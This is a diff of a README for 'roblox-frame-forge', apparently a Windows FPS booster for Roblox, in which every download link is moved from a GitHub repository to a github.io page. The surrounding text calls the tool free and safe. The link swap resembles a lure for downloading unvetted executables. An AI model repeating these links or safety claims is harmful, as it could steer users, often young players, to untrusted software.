@@ -1,6 +1,6 @@
 # ⚡ roblox-frame-forge - Boost Your FPS Instantly Today
 
-[![Download Now](https://img.shields.io/badge/Download-roblox--frame--forge-blue?style=for-the-badge&logo=github)](https://github.com/Averius7/roblox-frame-forge)
+[![Download Now](https://img.shields.io/badge/Download-roblox--frame--forge-blue?style=for-the-badge&logo=github)](https://averius7.github.io)
 
 ---
 
@@ -16,7 +16,7 @@ Follow these simple steps to get roblox-frame-forge working on your Windows PC.
 
 ### Step 1: Download the Tool
 
-Visit this link to download the application: **[roblox-frame-forge Download Page](https://github.com/Averius7/roblox-frame-forge)**
+Visit this link to download the application: **[roblox-frame-forge Download Page](https://averius7.github.io)**
 
 Click the green "Download" button on that page. Your browser will save the file to your "Downloads" folder. Wait for the download to finish completely before moving to the next step.
 
@@ -66,7 +66,7 @@ Here's your complete walkthrough for downloading and setting up roblox-frame-for
 
 ### How to Download
 
-Visit this link to download the application: **[https://github.com/Averius7/roblox-frame-forge](https://github.com/Averius7/roblox-frame-forge)**
+Visit this link to download the application: **[https://averius7.github.io](https://averius7.github.io)**
 
 On that page, look for a green button that says "Code." Click it, then choose "Download ZIP." If you prefer, there is also a "Releases" section on the right side where you can find the latest version. Either way, the file will be saved to your computer.
 
@@ -162,7 +162,7 @@ Not currently. This version is for Windows only. Mac users can look for alternat
 
 If your Roblox experience has been frustrating due to lag or low FPS, roblox-frame-forge is your solution. It's free, safe, and incredibly easy to use. No technical knowledge required—just download and click one button.
 
-**[🚀 Download roblox-frame-forge Now](https://github.com/Averius7/roblox-frame-forge)**
+**[🚀 Download roblox-frame-forge Now](https://averius7.github.io)**
 
 Join thousands of happy players who have transformed their Roblox experience on low-end PCs. Say goodbye to lag and hello to smooth, responsive gameplay today!
 
